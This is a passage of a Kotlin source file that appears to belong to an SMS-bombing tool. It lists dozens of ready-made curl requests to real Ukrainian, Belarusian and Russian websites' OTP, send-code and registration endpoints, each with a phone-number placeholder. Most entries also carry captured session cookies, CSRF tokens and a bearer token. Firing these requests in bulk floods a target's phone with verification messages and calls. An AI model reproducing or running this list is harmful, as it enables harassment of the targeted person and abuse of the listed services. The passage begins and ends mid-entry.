                          --data-raw '{"mobile_phone":"{full_phone}","password":"qwertyuiop123","password_confirm":"qwertyuiop123"}' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://ktc.ua/aj' \
                          -H 'authority: ktc.ua' \
                          -H 'accept: application/json, text/javascript, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: _ga_ss=01f58fa7e752ddd26800d292e45d6d4c; c_u=0; _kd=sG88q2SFhqYKflGiAw4IAg==; _gcl_au=1.1.1956271123.1686472363; _gid=GA1.2.317263012.1686472364; _dc_gtm_UA-20310467-1=1; _ga=GA1.2.991275439.1686472364; merge_after_login=1; _gat_UA-20310467-1=1; g_state={"i_p":1686479568712,"i_l":1}; _ga_4TCE34ZT6D=GS1.1.1686472363.1.0.1686472390.33.0.0' \
                          -H 'origin: https://ktc.ua' \
                          -H 'referer: https://ktc.ua/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'action=u&to=sendcode&locale=0&counter=0&phone={phone:(0**)+***-**-**}&source=auth' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://ktc.ua/aj' \
                          -H 'authority: ktc.ua' \
                          -H 'accept: application/json, text/javascript, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: _ga_ss=01f58fa7e752ddd26800d292e45d6d4c; c_u=0; _kd=sG88q2SFhqYKflGiAw4IAg==; _gcl_au=1.1.1956271123.1686472363; _gid=GA1.2.317263012.1686472364; _dc_gtm_UA-20310467-1=1; _ga=GA1.2.991275439.1686472364; merge_after_login=1; _gat_UA-20310467-1=1; g_state={"i_p":1686479568712,"i_l":1}; _ga_4TCE34ZT6D=GS1.1.1686472363.1.0.1686472382.41.0.0' \
                          -H 'origin: https://ktc.ua' \
                          -H 'referer: https://ktc.ua/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'action=users&to=register&locale=0&page=%2F&another_computer=0&phone=0{phone}&password=ty54ertthtr553453&name=gergergerg+gergerge+&email=bayeyip588%40runfons.com' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://pwa-api.eva.ua/api/user/send-code?storeCode=ua' \
                          -H 'authority: pwa-api.eva.ua' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'authorization: Bearer' \
                          -H 'content-type: application/json' \
                          -H 'origin: https://eva.ua' \
                          -H 'referer: https://eva.ua/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-site' \
                          -H 'x-device-type: mobile' \
                          --data-raw '{"phone":"{full_phone}"}' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://api-users.eldorado.ua/api/auth/phone/signin/?lang=ua' \
                          -H 'authority: api-users.eldorado.ua' \
                          -H 'accept: */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json' \
                          -H 'origin: https://eldorado.ua' \
                          -H 'referer: https://eldorado.ua/uk/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-site' \
                          -H 'user-client: website' \
                          -H 'user-client-version: 0.1.0' \
                          --data-raw '{"phone":"{full_phone}","step":"user_authorization","guid":"ba0a3710-0833-11ee-a296-01ffc3c56c0f"}' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://dok.ua/profile/login' \
                          -H 'authority: dok.ua' \
                          -H 'accept: */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: ab_group_version=A; is_sync=1; lbc=0; lang=ru; deviceId=3o4nx88onyqop8i8eloblivdqebdq5cu; sessionId=ir4gknzrit8pn2djicyhuddlok7qlxis; PHPSESSID=ft1j7jqg67q87g2p9otml5janr0bg5p67e6r3hh8m3hs2lngdu0enc2qp4ff8urfj; sourceTraffic=direct; traffic_source_params=%7B%7D; s=0; vh=0; ins=0; i1=1; cookie_transferred=1; _gid=GA1.2.1155098771.1686473132; _gat=1; _gcl_au=1.1.1213599210.1686473132; i2=1; c0={"Visit":true,"NoBounce":true,"Value":false,"Action":false,"Checkout":false,"NewOrder":false,"Accepted":false}; ct0=3; _ga_YH59FJRK2C=GS1.1.1686473133.1.0.1686473133.60.0.0; _ga=GA1.1.729404029.1686473132; _hjSessionUser_2676076=eyJpZCI6ImYzMDQ5ZjFhLWIxNzItNTI3My04YjFkLTJhMmE3OWFhNTI4NSIsImNyZWF0ZWQiOjE2ODY0NzMxMzQ4ODcsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2676076=0; _hjSession_2676076=eyJpZCI6IjEzNDgwMTZjLTRiZTYtNDI4Zi1hZmQ1LTY3Y2U3ZTQ1MzIwMiIsImNyZWF0ZWQiOjE2ODY0NzMxMzQ4OTUsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1686473139128.1038064024; sendCnt1=14; _gali=signinPopupSend' \
                          -H 'origin: https://dok.ua' \
                          -H 'referer: https://dok.ua/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'phone=0{phone}' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://kazan-divan.eatery.club/site/v1/pre-login' \
                          -H 'authority: kazan-divan.eatery.club' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json' \
                          -H 'origin: https://order.eatery.club' \
                          -H 'referer: https://order.eatery.club/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-site' \
                          --data-raw '{"phone":"{full_phone}"}' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://ucb.z.apteka24.ua/api/send/otp' \
                          -H 'authority: ucb.z.apteka24.ua' \
                          -H 'accept: */*' \
                          -H 'accept-language: ru' \
                          -H 'content-type: application/json; charset=utf-8' \
                          -H 'origin: https://www.apteka24.ua' \
                          -H 'referer: https://www.apteka24.ua/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-site' \
                          --data-raw '{"phone":"{full_phone}"}' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://bi.ua/api/v1/accounts' \
                          -H 'authority: bi.ua' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'authorization: Bearer null' \
                          -H 'content-type: application/json;charset=UTF-8' \
                          -H 'cookie: advanced-frontend=63bi71bvhh3gkf4ga42ga7ovi5; _csrf-frontend=48243b12d8de49cb4c65d614b699821d25297a4f0e7b8d705261ee5a0a393171a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22yVYcjTS7b2c0IBvZ0hgFCi_eL9tfOSfI%22%3B%7D; _gcl_au=1.1.1852567471.1686473460; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-06-11%2011%3A51%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Fbi.ua%2Fukr%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2023-06-11%2011%3A51%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Fbi.ua%2Fukr%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36; _hjFirstSeen=1; _hjIncludedInSessionSample_1559188=0; _hjSession_1559188=eyJpZCI6ImIwYzMxNWY1LTRlZDItNDc1OC05MjBmLTZkOTE4NTkyMWRlZiIsImNyZWF0ZWQiOjE2ODY0NzM0NjA5MzQsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _gid=GA1.2.294696729.1686473461; _dc_gtm_UA-8203486-4=1; _fbp=fb.1.1686473461419.375827223; cw_conversation=eyJhbGciOiJIUzI1NiJ9.eyJzb3VyY2VfaWQiOiIzZDlkZWE0NC03NGU1LTRkNjUtODI1Mi04OTg0OWY2MjJhZmEiLCJpbmJveF9pZCI6MjM0NzJ9.BMZdzGsGz3xOZWT_2jNAAHE5_QVsloR3wvJPLAVyvMQ; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbi.ua%2Fukr%2Fsignup%2F; _ga_71EP10GZSQ=GS1.1.1686473460.1.1.1686473470.50.0.0; _ga=GA1.2.905652775.1686473461; _hjSessionUser_1559188=eyJpZCI6IjQ2MzE3NDZmLWI3NTktNTYyNS1hMWFiLTRhMDVjYWVmNzIzNSIsImNyZWF0ZWQiOjE2ODY0NzM0NjA5MjIsImV4aXN0aW5nIjp0cnVlfQ==' \
                          -H 'language: uk' \
                          -H 'origin: https://bi.ua' \
                          -H 'referer: https://bi.ua/ukr/signup/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          --data-raw '{"grand_type":"call_code","stage":"1","login":"Акупкупк","phone":"{full_phone}"}' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://doc.ua/mobapi/patient/register' \
                          -H 'authority: doc.ua' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json' \
                          -H 'cookie: PHPSESSID=4csmnagmcrniaa483hvq9ei5t2; city_id=1; _gcl_au=1.1.989041886.1686473631; _clck=jqsin8|2|fcd|0|1257; _hjSessionUser_3416505=eyJpZCI6IjZhYTlmYzE0LTk3ODYtNTcwZC05OWMyLTYwYmMyNjhjZjU2YiIsImNyZWF0ZWQiOjE2ODY0NzM2Mzg4NzQsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_3416505=0; _hjSession_3416505=eyJpZCI6ImZjMjdkNjczLTQ2NDItNDA1NC05Yzk5LWM3YWNjMTJhNmQ1OCIsImNyZWF0ZWQiOjE2ODY0NzM2Mzg4ODMsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _ga=GA1.2.474365818.1686473632; _gid=GA1.2.1266520925.1686473639; _gat_UA-46229250-2=1; _fbp=fb.1.1686473639625.162560192; _clsk=12jj0qy|1686473640115|1|1|m.clarity.ms/collect; _ga_TTR066R00K=GS1.1.1686473631.1.0.1686473644.47.0.0' \
                          -H 'origin: https://doc.ua' \
                          -H 'platform: web' \
                          -H 'platformversion: 1' \
                          -H 'referer: https://doc.ua/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-app-lang: uk' \
                          -H 'x-csrf: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjc3JmIiwiZXhwIjoxNjg2NDc0MjU1fQ.jfwwL8gVsex5PqCn5NJXxuLzKkcobrXNCt0FNiM8PGk' \
                          --data-raw '{"login":"{full_phone}"}' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://remzona.by/profile' \
                          -H 'authority: remzona.by' \
                          -H 'accept: application/json, text/javascript, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: _rz=idv3np0e8kkp8s2p4hbpprqc5p; _ga_1791G2YBJC=GS1.1.1686473853.1.0.1686473853.0.0.0; _ga=GA1.1.1993536163.1686473853; _ym_uid=168647385448664470; _ym_d=1686473854; _ym_visorc=b; _ym_isad=2' \
                          -H 'origin: https://remzona.by' \
                          -H 'referer: https://remzona.by/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'phone=%2B{phone:375+(**)+***-**-**}&typerequest=sendcode' \
                          --compressed
                          """.trimIndent(), 375
    ),

    object : FormService("https://ostrov-shop.by/ajax/auth_custom.php", 375) {
        @SuppressLint("SimpleDateFormat")
        override fun buildBody(phone: Phone) {
            builder.add("backurl", "/basket/")
            builder.add("AUTH_FORM", "Y")
            builder.add("TYPE", "AUTH")
            builder.add("POPUP_AUTH", "Y")
            builder.add("USER_PHONE_NUMBER", format(phone.phone, "+375 (**) ***-**-**"))
            builder.add("UF_DATE_AGREE_DATA", SimpleDateFormat("dd.MM.yyyy HH:mm").format(Date()))
            builder.add("UF_CONSENT", "on")
            builder.add("Login1", "Y")
            builder.add("IS_AJAX", "Y")
        }
    },

    CurlService(
        """
                        curl 'https://api.starterapp.ru/clubve/auth/resetCode' \
                          -H 'authority: api.starterapp.ru' \
                          -H 'accept: application/json' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'authcode;' \
                          -H 'content-type: application/json' \
                          -H 'lang: ru' \
                          -H 'origin: https://clubve.delivery' \
                          -H 'referer: https://clubve.delivery/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: cross-site' \
                          -H 'sessionid: f6ef1f7b-b965-4543-ae91-a3912d62383b' \
                          -H 'timezone: Europe/Moscow' \
                          -H 'uber-trace-id: ff2d60ee0a3cf9cd3126326d812ca6a6:3a30b4cb28eded81:0:1' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          --data-raw '{"phone":"{full_phone}"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://vsesmart.ru/bitrix/services/main/ajax.php?mode=class&c=optimalgroup%3Aregistration&action=sendCode' \
                          -H 'authority: vsesmart.ru' \
                          -H 'accept: */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'bx-ajax: true' \
                          -H 'content-type: application/x-www-form-urlencoded' \
                          -H 'cookie: PHPSESSID=c317d05aac9ca023a290f06b2d88740b; BITRIX_SM_SALE_UID=25316472; BITRIX_SM_SELECTED_CITY_CODE=0000073738; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1688763540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.1.923212795.1688731854; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _ym_uid=1688731855610491033; _ym_d=1688731855; _ga_K6FJY61J0S=GS1.1.1688731854.1.1.1688731854.60.0.0; _ym_isad=2; _ym_visorc=w; tmr_lvid=ecdde2ab63feaf3850385c46e15ff6b8; tmr_lvidTS=1688731855075; _ymab_param=bzRQ384yMEtBC5vJtOQNPpxb45RC_bXaIMiSfSMmAAKRykv0aUUTorl53X8FGPFJq5hlKYJ0VXZVfJ7uOJ75SO7rRso; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; tmr_detect=0%7C1688731857426' \
                          -H 'origin: https://vsesmart.ru' \
                          -H 'referer: https://vsesmart.ru/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'x-bitrix-csrf-token: 4e748e24b4a55173d205b36e82f14323' \
                          -H 'x-bitrix-site-id: s1' \
                          --data-raw 'phone=%2B{phone:7(***)***-**-**}&isRegister=&token=' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://kino.tricolor.tv/api/register.php' \
                          -H 'authority: kino.tricolor.tv' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json' \
                          -H 'cookie: __jhash_=682; __jua_=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36; __hash_=0f83c4605e0610c6675921681e652be2; __lhash_=2ea6451564c0d750287211d8703fed4b; BITRIX_SM_SALE_UID=0; _gcl_au=1.1.317778883.1688732303; _ga_LF800FZY0Z=GS1.1.1688732303.1.0.1688732303.0.0.0; _ga=GA1.2.403171781.1688732304; _gid=GA1.2.1752351711.1688732307; _gat_UA-70840377-1=1; _gat_UA-46398561-16=1; tmr_lvid=8bd5856e1ad9be03c12e7e2370720a92; tmr_lvidTS=1648227495252; _ym_uid=1648227495934785743; _ym_d=1688732307; __js_p_=305,1800,0,0,0; tmr_detect=0%7C1688732309480; _ym_isad=2; _ym_visorc=b; afUserId=77c764ec-ac1d-4b63-b703-f6801bedb257-p; AF_SYNC=1688732310778; PHPSESSID=Mv1z2N1RBcK9irl40drL611EvTQm6Pps' \
                          -H 'origin: https://kino.tricolor.tv' \
                          -H 'referer: https://kino.tricolor.tv/?login&utm_source=lk.tricolor.tv&utm_medium=referral&utm_campaign=lk.tricolor.tv&utm_referrer=lk.tricolor.tv' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          --data-raw '{"phone":"{full_phone}","tricolorId":"","action":null,"sms":null}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://api.loverepublic.ru/web/v1/user/auth' \
                          -H 'authority: api.loverepublic.ru' \
                          -H 'accept: application/json' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'authorization: Bearer e1dbc1c7954b60a1df094bd7d48b39f594b5c4dc239bb2830ce13fc2b3d87a3e' \
                          -H 'content-type: application/json' \
                          -H 'origin: https://loverepublic.ru' \
                          -H 'referer: https://loverepublic.ru/catalog/sale/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-site' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          --data-raw '{"name":"","lastName":"","email":"","phone":"+7 {phone:(***) ***-**-**}","action":null}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://sravni.id/signin/code' \
                          -H 'authority: sravni.id' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: .AspNetCore.Antiforgery.vnVzMy2Mv7Q=CfDJ8P-kIPzZhllNqNW6zllVLAdMgC_Qf8_coTRI2iK-w-aXxTPMPdcSeWC-rGayiM4IQkShS-HlV3EMF4r4QvnJcL8fMmrEsCzF3mGkOIptILXeT6Yb5QFCOoOSfYOPWEfB5BVDurdEAnZ7N9w5WRp123c; __cf_bm=14DkP67ue9BjtUVqFUlzw5KxJOzMhXO91XzJX0QDJII-1689622732-0-AUtqf2WgLB3AC91m/QfsIt7wEtzI1LGJSlKud0+1yVpKRT19HM+mxZksyc8sVAFrPVNdlN+myNMMjBc4uGaSaRI=; _cfuvid=8ZczhhAMAOXzGK7CtSOtQO0tCgrTxHtu1rt76NjJS1g-1689622732596-0-604800000' \
                          -H 'origin: https://sravni.id' \
                          -H 'referer: https://sravni.id/signin?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dwww%26scope%3Dopenid%2520offline_access%2520email%2520phone%2520profile%2520roles%2520reviews%2520esia%2520orders.r%2520messagesender.sms%2520Sravni.Reviews.Service%2520Sravni.Osago.Service%2520Sravni.QnA.Service%2520Sravni.FileStorage.Service%2520Sravni.PhoneVerifier.Service%2520Sravni.Identity.Service%2520Sravni.VZR.Service%2520Sravni.Affiliates.Service%2520Sravni.News.Service%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252Fwww.sravni.ru%252Fopenid%252Fv2%252Fcallback%252F%26display%3Dpopup%26response_mode%3Dform_post%26state%3DtSfMLpp_vvSFc-XTzmwm_zh7jtg9GWkIugoEpzjpG_Y%26nonce%3D_pEEawHb2Hlgr7yLexFQZ8iwds29iab-SYB8d6fNeB4' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw '__RequestVerificationToken=CfDJ8P-kIPzZhllNqNW6zllVLAe3kD11i4o6PJwkMs1YGVoc9UcbSg92a5Y8PvGjEJpAj9OH27TdnIZT4O-UgcSs28xlKhKV7RAcL-QjlDTujrRSdT9NpC-rtpxFGSaEBBOtzKvKNOe1Q2trdR_tRWDRa3k&phone=%2B{full_phone}&returnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dwww%26scope%3Dopenid%2520offline_access%2520email%2520phone%2520profile%2520roles%2520reviews%2520esia%2520orders.r%2520messagesender.sms%2520Sravni.Reviews.Service%2520Sravni.Osago.Service%2520Sravni.QnA.Service%2520Sravni.FileStorage.Service%2520Sravni.PhoneVerifier.Service%2520Sravni.Identity.Service%2520Sravni.VZR.Service%2520Sravni.Affiliates.Service%2520Sravni.News.Service%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252Fwww.sravni.ru%252Fopenid%252Fv2%252Fcallback%252F%26display%3Dpopup%26response_mode%3Dform_post%26state%3DtSfMLpp_vvSFc-XTzmwm_zh7jtg9GWkIugoEpzjpG_Y%26nonce%3D_pEEawHb2Hlgr7yLexFQZ8iwds29iab-SYB8d6fNeB4' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://zdorov.ru/backend/api/customer/confirm' \
                          -H 'Accept: application/json' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Authorization;' \
                          -H 'Cache-Control: max-age=0' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/json' \
                          -H 'Cookie: qrator_jsr=1689622959.160.f6q4CAduxyTf1rsG-5gfcunfhk920271k1q8lb8m16obh35c3-00; qrator_jsid=1689622959.160.f6q4CAduxyTf1rsG-fjsnaqhr7gpjodsvcori4689hufhcd3s; qrator_ssid=1689622959.513.utJ9aMgZ8yhtBpQF-g817gbivabgq0t267p17j41pn31n7mp3; zdr_customer_external_id=e407b425-ad72-47ad-9d72-fd2a063025a3; _ym_uid=16707803281068577902; _ym_d=1689622964; _ym_isad=2; _ym_visorc=w; is-converted-basket=true; is-converted-liked=true; storage-shipment=%7B%22stockId%22%3A0%2C%22cityId%22%3A1%2C%22shipAddressId%22%3A0%2C%22shipAddressTitle%22%3A%22%22%2C%22stockTitle%22%3A%22%22%7D' \
                          -H 'Origin: https://zdorov.ru' \
                          -H 'Referer: https://zdorov.ru/' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-origin' \
                          -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw '{"phone":"{full_phone}","deviceId":null,"term":2}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://khesflowers.ru/index.php?route=extension/module/sms_reg_khes/SmsCheck' \
                          -H 'authority: khesflowers.ru' \
